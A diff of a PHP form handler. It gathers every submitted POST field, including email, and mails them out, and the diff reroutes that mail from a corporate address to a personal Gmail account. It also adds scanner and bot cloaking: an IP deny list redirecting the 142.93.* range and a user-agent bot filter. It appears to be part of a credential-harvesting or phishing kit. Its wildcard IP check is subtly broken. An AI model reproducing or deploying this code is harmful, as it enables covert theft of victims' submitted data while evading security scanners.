@@ -1,11 +1,27 @@
 
 <?php
 
+
+
+//if(strpos($_SERVER['REMOTE_ADDR'], "142.93") === 0) {
+//    die();
+//}
+
+$ip = $_SERVER['REMOTE_ADDR'];
+
+$deny = array("142.93.*");
+if (in_array ($_SERVER['REMOTE_ADDR'], $deny)) {
+   header("location: https://".$ip);
+   exit();
+
+   
+}
+
 //phpinfo(32);
 if (!isset($_SESSION)) {
     session_start();
 }
-if ($_SERVER['REQUEST_METHOD'] == 'POST'){
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['_id'] !== ''){
 
     
 if(isset($_POST['email'])){
@@ -53,12 +69,12 @@ foreach ($_POST as $key => $value)
 
 
     if($code == "vsdg"){
-        $to = "drodriguez@safeguardcasualty.com";
+        $to = "drod247@gmail.com";
         $in = 'vsdg';
     }elseif($code == "test"){
         echo $body;
     } else {
-        $to = "drodriguez@safeguardcasualty.com";
+        $to = "drod247@gmail.com";
     }
     
 
@@ -78,13 +94,17 @@ foreach ($bot_identifiers as $identifier) {
   if (strpos($user_agent, $identifier) !== FALSE) {
       $body .= 'This is a bot';
       $in = 'robot';
-      $to = "drodriguez@safeguardcasualty.com";
+      $to = "drod247@gmail.com";
         
     print(TRUE);
     exit();
   } 
 }
 ;
+if($in == ''){
+    $in = 'noreply';
+}
+
 
 $from = $in . '@' . $_SERVER['HTTP_HOST'];
 $headers = "From: " .$from;
@@ -92,7 +112,7 @@ $headers = "From: " .$from;
 
 mail($to, $subject, $body, $headers);
 
-echo $body;
+//echo $body;
 unset($_POST);
 //header("Location: ".$_SERVER['PHP_SELF']);
 exit;
@@ -112,7 +132,9 @@ if($_SERVER['QUERY_STRING'] !== 'beta'){
     $css = 'beta.css';
 
 }
-
+if (!file_exists('./script/')) {
+    mkdir('./script/', 0777, true);
+}
 if(!is_file('./script/'. $content)){
 
     $file = fopen('./script/'. $content, 'w') or die("Unable to open $content!");
